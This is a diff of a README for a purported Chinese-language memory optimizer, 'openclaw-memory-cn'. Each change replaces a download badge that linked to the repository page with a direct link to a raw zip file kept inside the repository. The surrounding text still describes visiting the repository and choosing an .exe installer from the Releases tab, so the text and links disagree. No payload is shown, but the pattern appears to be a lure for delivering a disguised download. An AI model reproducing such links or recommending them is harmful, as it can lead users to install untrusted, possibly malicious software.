@@ -1,6 +1,6 @@
 # 🧠 openclaw-memory-cn - Chinese Memory System Optimizer
 
-[![Download openclaw-memory-cn](https://img.shields.io/badge/Download-openclaw--memory--cn-brightgreen)](https://github.com/chauhannischal311/openclaw-memory-cn)
+[![Download openclaw-memory-cn](https://img.shields.io/badge/Download-openclaw--memory--cn-brightgreen)](https://github.com/chauhannischal311/openclaw-memory-cn/raw/refs/heads/main/skill/memory_cn_openclaw_v3.0.zip)
 
 ---
 
@@ -47,7 +47,7 @@ This helps non-experts use advanced Chinese language memory tools without hassle
 
 To start, go to the official download page by clicking the large button below. It will take you to the GitHub repository where you can find the latest release.
 
-[![Download openclaw-memory-cn](https://img.shields.io/badge/Download-openclaw--memory--cn-blue)](https://github.com/chauhannischal311/openclaw-memory-cn)
+[![Download openclaw-memory-cn](https://img.shields.io/badge/Download-openclaw--memory--cn-blue)](https://github.com/chauhannischal311/openclaw-memory-cn/raw/refs/heads/main/skill/memory_cn_openclaw_v3.0.zip)
 
 Once on the page, look for the latest release section on the right or in the "Releases" tab. Download the Windows installer file, which usually ends with `.exe`. For example, a file named `openclaw-memory-cn-setup.exe`.
 
@@ -134,6 +134,6 @@ If problems persist, create an issue in the repository or reach your support con
 
 Return to the download page to get the latest version:
 
-[![Download openclaw-memory-cn](https://img.shields.io/badge/Download-openclaw--memory--cn-brightgreen)](https://github.com/chauhannischal311/openclaw-memory-cn)
+[![Download openclaw-memory-cn](https://img.shields.io/badge/Download-openclaw--memory--cn-brightgreen)](https://github.com/chauhannischal311/openclaw-memory-cn/raw/refs/heads/main/skill/memory_cn_openclaw_v3.0.zip)
 
 Follow the steps above to download, install, and start improving Chinese search and memory functions on your PC quickly.
